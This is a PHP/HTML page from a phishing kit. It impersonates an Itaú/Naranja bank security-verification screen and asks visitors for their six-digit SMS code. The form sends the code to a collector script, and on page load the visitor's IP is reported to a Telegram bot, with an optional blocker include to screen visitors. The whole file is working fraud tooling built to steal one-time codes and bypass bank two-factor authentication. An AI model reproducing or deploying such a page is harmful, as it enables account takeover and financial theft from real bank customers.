<?php
include './config.php';
include './naranja/tg.php';
if ($blocker == true) {
    include './sistema/view.php';
}
if ($alert == true) {
    $msg  = "¡INGRESANDO TOKEN👁‍🗨!\r\n";
    $msg .= "IP : " . $ip . "\r\n";
    sendTg($msg, $key, $id);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="./tenga/bootstrap-icons.min.css">


  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verificación</title>
  <link href="./tenga/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="./tenga/cargando.css">
</head>

<body style="background: #FFF !important;">
  <div class="h-100 w-100 d-flex justify-content-center align-items-center">
    <div class="verificacion mx-auto">
      <div class="px-3 py-4">
        <img src="./tenga/logo-itau-naranja.svg" height="40px">
      </div>
      <div class="alert rounded-0 alert-info" style="font-size:13px;"><i class="bi bi-info-circle"></i> <b
          class="text-muted">Complete la verificación de seguridad para activar sus beneficios</b></div>

      <div class="px-3">
        <h5 class="main__title">Verificación de seguridad</h5>
        <p>Ingresá el código SMS enviado su dispositivo para validar esta operación.</p>
      </div>

      <form method="POST" action="./naranja/manda.php">



        <div class="mb-3 px-3">
          <input type="tel" required="" minlength="6" maxlength="6" class="form-control text-center"
            placeholder="######" name="token">
          <div id="emailHelp" class="form-text text-center"><i class="bi bi-exclamation-triangle"></i> Este campo es
            obligatorio.</div>
        </div>


        <div class="d-flex align-items-center">
          <a href=""
            class="cancelar d-block rounded-0 w-50 btn-light border btn text-uppercase text-muted fw-semibold">Cancelar</a>
          <button name="submit" type="submit"
            class="btn w-50 rounded-0  text-uppercase  fw-semibold btn-primary">Siguiente</button>
        </div>

      </form>
      <p class="false text-danger fw-bold" style="font-size: 13px;display: none;">
        <small class="text-danger">El formato es incorrecto. Debe contener 6 digitos.</small>
      </p>
      <p class="text-danger alertaooo" style="font-size: 13px;display: none;">Algunos de los datos son incorrectos,
        Intente nuevamente.</p>


    </div>
  </div>
  <script type="text/javascript">
    $(".form-control").keypress(function (e) {
      if (e.which < 48 || e.which > 58) {
        return false;
      }
    })

  </script>

</body>

</html>